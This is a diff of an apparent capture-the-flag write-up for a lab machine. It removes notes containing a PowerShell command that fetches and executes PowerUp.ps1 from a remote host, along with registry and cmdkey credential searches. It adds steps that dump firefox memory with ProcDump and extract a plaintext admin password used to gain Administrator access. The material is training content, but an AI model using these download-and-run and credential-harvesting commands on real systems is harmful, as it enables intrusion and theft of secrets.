@@ -88,13 +88,46 @@ Done:
 1. Restricted access for guest user.
 ```
 
-
-Need to check what is running???
-
-
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.55:8000/PowerUp.ps1'); Invoke-AllChecks"
+Having a look at the process running we can see `firefox` is taking up a large amount of resources.
 
 
-REG QUERY HKLM /F "password" /t REG_SZ /S /K
+```
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName 
+    407      31    17396      61224       1.72    320   1 firefox                          
+    341      18    10036      37488       1.23   1136   1 firefox                          
+    390      30    26352      58724      14.22   4008   1 firefox                      
+   1241      68   105976     178564      26.02   5112   1 firefox                       
+    358      26    16380      37636       1.14   6196   1 firefox  
+```
 
-cmdkey /list
+I initially tried a `profile` way like `Chaos` but this didn't work. Further research implied I should look at processes memory. This can be achieved by [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).
+
+Running:
+
+```
+./procdump.exe -ma <PROCESS_ID>
+```
+s
+Creates a dump file that then can be searched through like so:
+
+
+```
+Get-ChildItem -Path ./firefox.exe_190930_192158.dmp -Recurse -File | Select-String "admin"
+```
+
+`admin` was chosen as a string due to the assumption that the login page we encountered earlier was being hosted internally.
+
+
+This then gives us this output!
+
+```
+firefox.exe_190930_192158.dmp:5410:��MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=+
+```
+
+We can see the `admin` password in the `GET` request:
+
+```
+login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ
+```
+
+This lets us login as the Administrator and grab the `root.txt`!
